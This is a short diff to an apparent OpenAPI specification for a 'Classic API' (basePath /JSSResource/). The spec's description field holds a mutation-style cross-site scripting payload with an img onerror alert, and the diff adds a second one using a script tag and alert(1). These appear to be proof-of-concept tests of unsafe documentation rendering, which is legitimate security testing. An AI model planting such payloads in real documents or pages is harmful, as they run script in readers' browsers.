@@ -3,7 +3,8 @@ info:
   title: Classic API Resource Documentation
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Carlos-Tuma-XSS') src=1>"></form>
-
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script\x20type="text/javascript">javascript:alert(1);</script>"></form>
+    
   version: production
 basePath: /JSSResource/
 produces:
